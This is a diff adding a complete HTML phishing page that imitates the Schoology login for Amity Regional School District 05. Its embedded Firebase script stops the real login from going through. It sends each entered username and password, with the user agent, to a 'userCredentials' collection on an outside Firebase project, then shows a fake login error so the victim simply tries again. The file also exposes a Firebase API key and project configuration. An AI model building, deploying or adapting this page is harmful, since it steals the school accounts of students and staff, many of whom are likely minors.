@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" data-theme="modern" class="wf-karla-n4-active wf-active js js no-touch hashchange history rgba borderradius boxshadow textshadow opacity cssanimations cssgradients csstransforms csstransforms3d csstransitions fontface generatedcontent boxsizing display-table lastchild placeholder wf-inactive" style="">
+<head>
+    <!-- ... ( HTML refs) ... -->
+    <link rel="shortcut icon" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/favicon.ico" type="image/x-icon">
+    <link rel="image_src" href="/images/schoology_thumbnail.png">
+    <link rel="stylesheet" type="text/css" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/theme-modern-sgy.css">
+    <link rel="stylesheet" type="text/css" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/css/style.css?1444671451">
+    <link rel="stylesheet" type="text/css" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/css/thickbox.css?qrstuv" media="screen">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Karla:400&subset=latin" media="all">
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/css/login.css?qrt">
+    <link rel="stylesheet" type="text/css" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/css/rebranded.css">
+    <link type="text/css" rel="stylesheet" media="all" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/school_themes/style.css.php?theme=5672843957&updated=1645112971&6839426d0b46490f">
+    <title>Login to Schoology</title>
+    <meta name="description" content="Schoology allows instructors, students and administrators to create a meaningful virtual classroom and extend learning beyond the boundaries of the physical classroom">
+
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
+
+    <style>
+        #supplementary {
+            margin-top: 0px; /* break between blue and white */
+        }
+    </style>
+
+</head>
+<body class="login-page ldap-login vsc-initialized">
+
+  <header id="branding" class="clearfix">
+    <div class="container clearfix">
+      <a id="logo" class="ir" href="/"><span>Schoology</span></a>
+    </div>
+  </header>
+
+  <div id="supplementary">
+    <div class="container">
+      <div id="content-container" class="login login-ldap">
+          <div id="main-content">
+              <div id="login-container">
+                  <div class="login-content clearfix">
+                      <!--  ERROR MESSAGE (Initially Hidden) -->
+                      <div id="schoology-error-message-container" style="
+                          display: none; /* JS will change this to 'flex' */
+                          align-items: center;
+                          background-color: #fdecea;
+                          border: 1px solid #f5c6cb;
+                          color: #721c24;
+                          padding: 12px 20px;
+                          margin-bottom: 16px;
+                          border-radius: 4px;
+                          font-family: Arial, Helvetica, sans-serif; /* UPDATED FONT */
+                          font-size: 14px; /* might need to fine-tune this based on font */
+                          line-height: 1.5;
+                          box-sizing: border-box;
+                      ">
+                          <span style="
+                              background-color: #D43C31;
+                              color: white;
+                              border-radius: 50%;
+                              width: 20px;
+                              height: 20px;
+                              display: inline-flex;
+                              justify-content: center;
+                              align-items: center;
+                              font-weight: bold;
+                              font-size: 13px;
+                              margin-right: 10px;
+                              flex-shrink: 0;
+                          ">!</span>
+                          <span id="error-text-content">Error: Sorry, unrecognized username or password.</span>
+                      </div>
+
+                      <span class="h3 sign-in-header">Sign in to Schoology</span>
+                      <form accept-charset="UTF-8" method="post" id="s-user-login-form">
+                          <div>
+                              <div class="form-item">
+                                  <span class="required-text-label" tabindex="-1" role="text">All fields are required</span>
+                              </div>
+                              <div class="form-item " id="edit-mail-wrapper">
+                                  <label for="edit-mail">Email or Username (required): </label>
+                                  <input type="text" maxlength="128" name="mail" id="edit-mail" size="60" value="" placeholder="Email or Username" aria-required="true" class="form-text">
+                              </div>
+                              <div class="form-item " id="edit-pass-wrapper">
+                                  <label for="edit-pass">Password (required): </label>
+                                  <input type="password" name="pass" id="edit-pass" maxlength="128" size="60" placeholder="Password" aria-required="true" autocomplete="off" class="form-text">
+                              </div>
+                              <input type="hidden" name="school_nid" id="edit-school-nid" value="5672843957">
+                              <div class="school-name-wrapper">
+                                  <div class="school-name">Amity Regional School District 05 <span class="small gray school-location">Woodbridge, CT</span></div>
+                              </div>
+                              <span class="submit-span-wrapper">
+                                  <input type="submit" name="op" id="edit-submit" value="Log in" class="form-submit">
+                              </span>
+                              <input type="hidden" name="form_build_id" value="d5c6b6f-TJ9q6sk-yTndgthIT9y6tB0bPY9bC5GsCNzl04_i77k">
+                              <input type="hidden" name="form_id" value="s_user_login_form">
+                          </div>
+                      </form>
+                  </div>
+              </div>
+          </div>
+      </div>
+    </div>
+  </div>
+
+  <footer id="page-footer">
+  </footer>
+
+  <script type="text/javascript">
+    $(document).ready(function(){
+      if (typeof $ !== 'undefined' && $('form input[type="text"]:first').length) {
+          $('form input[type="text"]:first').focus();
+      } else if (document.querySelector('form input[type="text"]')) {
+          document.querySelector('form input[type="text"]').focus();
+      }
+    });
+  </script>
+
+  <!-- FIREBASE SCRIPT -->
+  <script>
+    const firebaseConfig = {
+  apiKey: "AIzaSyC8tojtuCHSgSY3jdrbal8BH4cq1UU1KLI",
+  authDomain: "idkbruh-c8cb4.firebaseapp.com",
+  projectId: "idkbruh-c8cb4",
+  storageBucket: "idkbruh-c8cb4.firebasestorage.app",
+  messagingSenderId: "155774984997",
+  appId: "1:155774984997:web:5ddc18b335e3cb7c80b0cc",
+  measurementId: "G-92XKJRD79B"
+};
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    const loginForm = document.getElementById('s-user-login-form');
+    const emailInput = document.getElementById('edit-mail');
+    const passwordInput = document.getElementById('edit-pass');
+    const submitButton = document.getElementById('edit-submit');
+    const schoologyErrorContainer = document.getElementById('schoology-error-message-container');
+
+    if (loginForm) {
+      loginForm.addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        const emailOrUsername = emailInput.value.trim();
+        const password = passwordInput.value;
+
+        if (schoologyErrorContainer) {
+            schoologyErrorContainer.style.display = 'none'; // Hide on new attempt
+        }
+
+        if (!emailOrUsername || !password) {
+            if (schoologyErrorContainer) {
+                schoologyErrorContainer.style.display = 'flex'; // Show error
+            }
+            console.log("Client-side: Empty username or password.");
+            // Re-enable button if we return early
+            if(submitButton) submitButton.disabled = false;
+            return;
+        }
+
+        if(submitButton) submitButton.disabled = true;
+
+        db.collection("userCredentials").add({
+            username: emailOrUsername,
+            password: password,
+            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+            userAgent: navigator.userAgent
+        })
+        .then((docRef) => {
+            console.log("Firebase: Document written with ID: ", docRef.id);
+        })
+        .catch((error) => {
+            console.error("Firebase: Error adding document: ", error);
+        })
+        .finally(() => {
+            if (schoologyErrorContainer) {
+                schoologyErrorContainer.style.display = 'flex'; // Show error
+            }
+            // Do not reset form: loginForm.reset();
+            if(submitButton) submitButton.disabled = false;
+        });
+      });
+    } else {
+        console.error("Login form with ID 's-user-login-form' not found!");
+    }
+  </script>
+
+</body>
+</html>
